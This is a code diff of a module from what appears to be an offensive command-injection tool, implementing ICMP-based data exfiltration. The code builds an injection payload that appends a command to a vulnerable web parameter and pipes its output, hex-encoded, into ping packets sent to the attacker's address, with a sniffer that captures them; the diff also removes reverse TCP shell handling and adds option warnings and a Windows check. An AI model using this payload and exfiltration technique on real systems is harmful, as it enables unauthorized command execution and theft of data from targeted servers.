@@ -77,7 +77,6 @@ def packet_handler(Packet):
 def signal_handler(signal, frame):
   os._exit(0)
 
-
 def snif(ip_dst, ip_src):
   print( Style.BRIGHT + "(!) Started the sniffer between " + Fore.YELLOW + ip_src + Style.RESET_ALL + Style.BRIGHT + 
         " and " + Fore.YELLOW + ip_dst + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
@@ -85,7 +84,6 @@ def snif(ip_dst, ip_src):
   while True:
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
  
-
 def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   # icmp exfiltration payload.
   payload = ('; ' + cmd + ' | xxd -p -c8 | while read line; do ping -p $line -c 1 -s16 -q ' + ip_src + '; done')
@@ -103,8 +101,18 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
 
-
 def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
+
+  err_msg = ""
+  if menu.enumeration_options():
+    err_msg += "enumeration"
+  if menu.file_access_options():
+    if err_msg != "":
+      err_msg = err_msg + " and "
+    err_msg = err_msg + "file-access"
+
+  print Fore.YELLOW + settings.WARNING_SIGN + "The " + err_msg + " options are not supported by this module because of the structure of the exfiltrated data. Please try using any unix-like commands manually." + Style.RESET_ALL 
+     
   # Pseudo-Terminal shell
   go_back = False
   go_back_again = False
@@ -138,28 +146,7 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
             elif cmd.lower() == "os_shell": 
               print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'os_shell' mode." + Style.RESET_ALL + "\n"
             elif cmd.lower() == "reverse_tcp":
-              # Set up LHOST / LPORT for The reverse TCP connection.
-              reverse_tcp.configure_reverse_tcp()
-              if settings.REVERSE_TCP == False:
-                continue
-              while True:
-                if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
-                  result = checks.check_reverse_tcp_options(settings.LHOST)
-                else:  
-                  cmd = reverse_tcp.reverse_tcp_options()
-                  result = checks.check_reverse_tcp_options(cmd)
-                if result != None:
-                  if result == 0:
-                    return False
-                  elif result == 1 or result == 2:
-                    go_back_again = True
-                    settings.REVERSE_TCP = False
-                    break
-                # Command execution results.    
-                cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
-                if menu.options.verbose:
-                  print ""
-                print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection to the target host has been failed!" + Style.RESET_ALL
+              print Fore.YELLOW + settings.WARNING_SIGN + "This option is not supported by this module." + Style.RESET_ALL + "\n"
           else:
             # Command execution results.
             cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
@@ -258,19 +245,26 @@ def icmp_exfiltration_handler(url, http_request_method):
         else:
           os._exit(0)
 
-  ip_data = menu.options.ip_icmp_data
-      
-  technique = "icmp exfiltration technique"
-  sys.stdout.write(settings.INFO_SIGN + "Testing the " + technique + "... \n")
-  sys.stdout.flush()
-  
-  ip_src =  re.findall(r"ip_src=(.*),", ip_data)
-  ip_src = ''.join(ip_src)
-  
-  ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
-  ip_dst = ''.join(ip_dst)
-  
-  exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)
+  if settings.TARGET_OS == "win":
+    print Back.RED + settings.ERROR_SIGN + "This module's payloads are not suppoted by the identified target operating system." + Style.RESET_ALL + "\n"
+    os._exit(0)
+
+  else:
+    technique = "ICMP exfiltration module"
+    sys.stdout.write(settings.INFO_SIGN + "Loading the " + technique + ". \n")
+    sys.stdout.flush()
+
+    ip_data = menu.options.ip_icmp_data
+
+    #  Source IP address
+    ip_src =  re.findall(r"ip_src=(.*),", ip_data)
+    ip_src = ''.join(ip_src)
+
+    # Destination IP address
+    ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
+    ip_dst = ''.join(ip_dst)
+    
+    exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)
 
 if __name__ == "__main__":
   icmp_exfiltration_handler(url, http_request_method)
